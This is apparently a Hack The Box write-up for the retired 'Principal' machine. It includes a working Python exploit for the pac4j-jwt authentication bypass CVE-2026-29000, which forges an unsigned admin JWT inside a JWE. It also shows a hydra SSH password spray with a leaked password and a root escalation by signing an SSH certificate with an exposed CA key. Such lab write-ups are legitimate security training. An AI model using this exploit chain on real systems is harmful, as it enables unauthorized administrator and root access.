---
title: Principle
date: 2026-05-17
excerpt: HackTheBox - Medium
cover: ../uploads/cover_principle.jpg
tags: CVE-2026-29000
---

# HackTheBox Principal— Writeup

Welcome back to my write-up. In this post, I’ll walk you through a clear, step-by-step breakdown of how I solved one of the recently retired machine on Hack The Box, Principal. I’ll go through my thought process from initial enumeration to the final exploitation, highlighting the key findings, techniques, and decisions along the way. Whether you’re following along to learn or just curious about the approach, this guide should help you understand how each stage of the challenge was tackled and how everything eventually came together to achieve the root flag.

Let's start

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fbb0KjmKQVnpAtNpK7abu%252Fgiphy-downsized-large.gif%3Falt%3Dmedia%26token%3D3dc712dd-a93c-431e-97f1-af29b8b5f2dc&width=768&dpr=3&quality=100&sign=1ecd20bf&sv=2)

## Reconnaissance

Now, let’s begin by scanning the open ports using `Nmap` to identify possible entry points into the target system.

`nmap -A -T5 10.129.244.220`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FhcHeh82zAtvWy8OtO3kC%252FScreenshot%2520%282389%29.png%3Falt%3Dmedia%26token%3D2c76c011-e7ae-4130-967b-02fdf6de644c&width=768&dpr=3&quality=100&sign=51c6b10b&sv=2)

The OpenSSH version suggests that the machine is probably using **Ubuntu 24.04 Noble LTS**. In addition, a Java-based Jetty web server is running on port `8080`.

Let's visit the website:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FBNAP3NLLi7uhPkIEkogt%252FScreenshot%2520%282390%29.png%3Falt%3Dmedia%26token%3Dc62d8681-2fa9-4411-a23c-32bf9fb6b921&width=768&dpr=3&quality=100&sign=4b6c525e&sv=2)

The page we’re looking at is a login interface, and it’s powered by **pac4j**, a Java-based security framework. pac4j is commonly used to manage authentication and authorization in web applications, acting as a flexible security layer that supports multiple identity protocols such as OAuth, SAML, OpenID Connect, and JWT.

It works by centralizing the login process and delegating authentication to external identity providers, making it easier for developers to implement secure access control without building everything from scratch. In practice, this means it can handle everything from single sign-on (SSO) to token-based authentication, while also enforcing authorization rules once a user is authenticated.

While reviewing the interface’s source code, I went to `static/js/app.js`, which appears to handle authentication logic.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FnbcRhJ7X1mKfrFGQRfex%252FScreenshot%2520%282391%29.png%3Falt%3Dmedia%26token%3D475eac58-68fb-45b2-903e-d4fed6984995&width=768&dpr=3&quality=100&sign=60517aca&sv=2)

When I access `/api/auth/jwks`, it returns the public key used to verify a JWT signed with asymmetric encryption.

`curl http://10.129.244.220:8080/api/auth/jwks`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbAnmkGCDYrz33y6RYzHg%252FScreenshot%2520%282393%29.png%3Falt%3Dmedia%26token%3D92f40cbe-01c6-46b3-a8f9-a8ad0b7bc95b&width=768&dpr=3&quality=100&sign=4447e6a&sv=2)

After that, I proceeded to brute-force the subdirectories, but I didn’t find anything useful.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FqhOu1Gwf4XTHXOoyw2vi%252FScreenshot%2520%282395%29.png%3Falt%3Dmedia%26token%3D742380c5-376e-45b1-9a4b-25f0a7834644&width=768&dpr=3&quality=100&sign=a69e479b&sv=2)

## Exploitation

### Discovering the Vulnerability (CVE-2026-29000)

So I've search for some known CVE for `pac4j` , and I've found this article from [CiSecurity](https://www.cisecurity.org/advisory/a-vulnerability-in-pac4j-jwt-jwtauthenticator-could-allow-for-authentication-bypass_2026-019).

CVE-2026-29000 describes a critical vulnerability in the **pac4j-jwt (JwtAuthenticator)** component that can lead to an authentication bypass. pac4j-jwt is part of the pac4j security framework used for creating, validating, and managing JSON Web Tokens (JWTs) in web applications and services. It supports both signed and encrypted tokens and relies on the Nimbus JOSE+JWT library for handling token processing, authentication flows, profile creation, and signature verification.

The issue affects **pac4j-jwt versions prior to 4.5.9, 5.7.9, and 6.3.3**, where JwtAuthenticator improperly handles encrypted JWTs. This flaw allows remote attackers to forge authentication tokens. In particular, an attacker who has access to the server’s RSA public key can craft a **JWE-wrapped PlainJWT** containing arbitrary claims, such as modified subject identities and elevated roles.

By exploiting this weakness, an attacker can bypass signature verification entirely and authenticate as any user in the system, including administrators, without needing any secret key or valid credentials.

In essence, if an attacker is able to obtain the JWT public key, they could potentially impersonate any user in the system. This flaw was first identified and reported by researchers at [CodeAnt AI](https://www.codeant.ai/security-research/pac4j-jwt-authentication-bypass-public-key), who documented the issue in detail in a blog post.

JWTs are often encrypted using a server’s public key to ensure their contents remain protected during transmission. However, the researchers discovered that when an encrypted token is present but the inner JWT lacks a valid signature, a logical flaw in the implementation may cause the system to skip proper inner token verification. As a result, the application mistakenly treats the token as legitimate, effectively allowing authentication to succeed without proper validation.

### Understanding the Vulnerable Code

```java
// Step 1: Decrypt the JWE
for (EncryptionConfiguration config : encryptionConfigurations) {
    try {
        encryptedJWT.decrypt(config);

        // Step 2: Try to extract the inner signed JWT
        signedJWT = encryptedJWT.getPayload().toSignedJWT();

        if (signedJWT != null) {
            jwt = signedJWT;
        }

        found = true;
        break;
    } catch (JOSEException e) { ... }
}

// Step 3: Verify signature - BUT ONLY IF signedJWT IS NOT NULL
if (signedJWT != null) {
    for (SignatureConfiguration config : signatureConfigurations) {
        if (config.supports(signedJWT)) {
            verify = config.verify(signedJWT);
            // ...
        }
    }
}

// Step 4: Create authenticated profile from token claims
createJwtProfile(ctx, credentials, jwt);
```

According to CodeAnt AI, the problem lies in this section of the pac4j code. When a JWT that does not include a signature is passed into `toSignedJWT()`, the function returns `null`. Later, during what is described as Step 3 of the verification process, the code checks the `signedJWT` value, but if it is `null`, that validation step is effectively bypassed and no further verification is performed.

The article points to retrieving JWKS data from `/.well-known/jwks.json`, but in this case I’ve already located it earlier at `/api/auth/jwks`. With that public key available, I can proceed to use Python to generate a token encrypted with it, while leaving the inner JWT without any authentication.

### Crafting the Exploit Script

```python
import sys, json, base64, requests
from datetime import datetime, timezone, timedelta
from jwcrypto import jwk, jwe

b64 = lambda x: base64.urlsafe_b64encode(x).decode().rstrip("=")

# build unsigned JWT (alg=none style token)
def jwt0(user, role):
    # role validation gate
    if role not in ["ROLE_ADMIN", "ROLE_MANAGER", "ROLE_USER"]:
        raise Exception("bad role")

    now = datetime.now(timezone.utc)

    # JWT header + payload
    header = {"alg": "none"}
    payload = {
        "sub": user,
        "role": role,
        "iss": "principal-platform",
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(hours=24)).timestamp()),
    }

    # encode as JWT format: header.payload.
    return f"{b64(json.dumps(header).encode())}.{b64(json.dumps(payload).encode())}."

def run():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} <host> [port]")
        sys.exit()

    host = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else 8080

    print(f"[*] target => {host}:{port}")

    # fetch public JWKS endpoint
    jwks = requests.get(f"http://{host}:{port}/api/auth/jwks").json()

    if not jwks.get("keys"):
        print("[-] no keys found")
        sys.exit()

    print(f"[+] keys loaded => {len(jwks['keys'])}")

    # extract RSA public key from JWKS
    rsa_key = jwk.JWK(**[k for k in jwks["keys"] if k["kty"] == "RSA"][0])
    print(f"[+] rsa key loaded => kid={rsa_key.get('kid', 'none')}")

    # forge fake identity token
    token = jwt0("kuro", "ROLE_ADMIN")

    # wrap JWT inside JWE encryption layer
    box = jwe.JWE(
        plaintext=token.encode(),
        protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A256GCM"}),
        recipient=rsa_key,
    )
    
    print(f"[+] encrypted token stream: {box.serialize(compact=True)}")

if __name__ == "__main__":
    run()
```

### Forging the JWT and Gaining Dashboard Access

Now let's generate a forged token:

`python3 jwtz.py 10.129.244.220 8080`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FFVfg0KVCCpCB7TSOJyUf%252FScreenshot%2520%282402%29.png%3Falt%3Dmedia%26token%3D9589976a-0aba-4f30-a139-8af49d659cf5&width=768&dpr=3&quality=100&sign=7a696aeb&sv=2)

With the forged token ready, the next step is to set it in the browser so we can access the dashboard.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fv2KeKCTm3smIj9HedkbQ%252FScreenshot%2520%282404%29.png%3Falt%3Dmedia%26token%3Da5950c45-abd7-406e-89df-ba27e361e96b&width=768&dpr=3&quality=100&sign=872b495e&sv=2)

In the earlier `app.js` file, there is a `TokenManager` class defined, which indicates that the JWT is saved in the browser’s session storage under the key `auth_token`.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fgisk8FGKGh1hwAozLlmc%252FScreenshot%2520%282405%29.png%3Falt%3Dmedia%26token%3D1b9e87bd-9005-46c2-ae08-6ac8175bb7a0&width=768&dpr=3&quality=100&sign=a893b75a&sv=2)

We just need to refresh the page, and that should grant access to the dashboard.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJtZ9eGRIiyVVXagJ1uoy%252FScreenshot%2520%282406%29.png%3Falt%3Dmedia%26token%3D64a22c78-8a18-45ce-b756-e04cb27c7891&width=768&dpr=3&quality=100&sign=d114ef21&sv=2)

We're in! Now let's explore the dashboard.

### Extracting Credentials from the Dashboard

From the dashboard, I can extract several useful details. In the `Users` section, there is a displayed list of user accounts.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDQnGlJXAC7pE9ZUeeaty%252FScreenshot%2520%282439%29.png%3Falt%3Dmedia%26token%3Dd32ed232-fbff-4cde-9d20-c7d4a7f32abd&width=768&dpr=3&quality=100&sign=a0fa52d6&sv=2)

On the `Settings` page, there is a field labeled `encryptionKey` which strongly suggests that it could be used as an SSH password.

I also noticed an interesting reference to a file path. It points to `/opt/principal/ssh` and indicates that SSH certificate-based authentication is enabled. (I forgot to take a screenshot of this hehe)

### Brute-Forcing SSH with the Discovered Credentials

Our next move is to take the user list we found on the `Users` page and attempt a brute-force attack on those usernames using the password we discovered, which corresponds to the value of `encryptionKey`. For this, process we will use `hydra` .

`hydra -L user.txt -p 'D3pl0y_$$H_Now42!' 10.129.244.220 ssh`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUgFtUduGP6QOqPCtGhfQ%252FScreenshot%2520%282409%29.png%3Falt%3Dmedia%26token%3D94430272-f730-494b-a2e9-284cf9a8419a&width=768&dpr=3&quality=100&sign=d048c927&sv=2)

Now that we've got the valid credentials, let's login to ssh using `svc-deploy` .

`ssh svc-deploy@10.129.244.220`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FqpC4pbmNW7tfISbxF5TF%252FScreenshot%2520%282411%29.png%3Falt%3Dmedia%26token%3D8e17a627-fc63-4557-b5eb-765930e835ef&width=768&dpr=3&quality=100&sign=95bb96dc&sv=2)

We're in!!

## Privilege Escalation

### Discovering the SSH Certificate Authority Setup

Remember the SSH path we came across earlier (the one without a screenshot)? It’s worth examining more closely. I went ahead and navigated to `/opt/principal/ssh`, and this is what I found.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXlpQ893q7pD7hVCZByab%252FScreenshot%2520%282414%29.png%3Falt%3Dmedia%26token%3Ddad0bd15-7a61-4342-b8c5-e223fb191602&width=768&dpr=3&quality=100&sign=fc8dc712&sv=2)

Let's read the `README.txt`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FyywFztyCnKWnK7Umte3t%252FScreenshot%2520%282416%29.png%3Falt%3Dmedia%26token%3Da9e30ff1-769d-4384-b656-edcd71c646de&width=768&dpr=3&quality=100&sign=9c4e3a71&sv=2)

The `README.txt` file provides information about the other files in the directory and the remaining two files form a matched pair of cryptographic keys: a private certificate key and its corresponding public certificate key.

I also checked the `sshd` configuration and found something interesting.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FKYb5fB95AvWbgvJXN7E1%252FScreenshot%2520%282419%29.png%3Falt%3Dmedia%26token%3D2fe2e332-e13e-4741-a915-4ac0fae383cc&width=768&dpr=3&quality=100&sign=fbb1e7ab&sv=2)

In a typical SSH CA setup, when `TrustedUserCAKeys` is enabled, administrators often also configure either `AuthorizedPrincipalsFile` or `AuthorizedPrincipalsCommand` to control how certificate principals are mapped to specific user accounts. However, if neither of these options is defined, SSH will directly map the certificate principal names to local usernames by default.

In that scenario, if someone can generate a certificate signed with the trusted CA private key and set the principal to `root`, it would be accepted as authentication for the root account. Even though `PermitRootLogin` is set to `prohibit-password`, which disables password-based root logins, it does not block key or certificate-based authentication, meaning SSH certificate login would still be permitted.

### Forging a Root Certificate and Escalating

To escalate privileges using this trick, I first generate a new key pair on my attacker machine.

`ssh-keygen -t ed25519 -f ssh-root`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FazuO5MgrfXBHiX2LAhiT%252FScreenshot%2520%282430%29.png%3Falt%3Dmedia%26token%3Dc8664f60-2dce-40ce-b531-06daa1dcb2cf&width=768&dpr=3&quality=100&sign=37431207&sv=2)

Next, I use the CA key we saw earlier along side with the `README.txt` to sign the certificate with `ssh-keygen -s`. I set an identifier using `-I kur0`, which is just a label for the certificate, and specify `-n root` as the principal. Since there is no `AuthorizedPrincipalsFile` configured, this principal directly maps to the `root` user account.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9Yncz5NrsjpkqmVyGE11%252FScreenshot%2520%282435%29.png%3Falt%3Dmedia%26token%3Dabeb4ff6-cb50-45c2-bc5b-a745af12f846&width=768&dpr=3&quality=100&sign=acf36f34&sv=2)

Now I can use the signed private key to authenticate and log in as the root user.

`ssh -i ssh-root root@10.129.244.220`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FAg6cJlQsZz65TIVcKbqC%252FScreenshot%2520%282436%29.png%3Falt%3Dmedia%26token%3Dada4d106-1ab1-4b2f-93d7-f302adf2fdb5&width=768&dpr=3&quality=100&sign=6a1c1d60&sv=2)

We're done! We've successfully pwned **Principal**!!
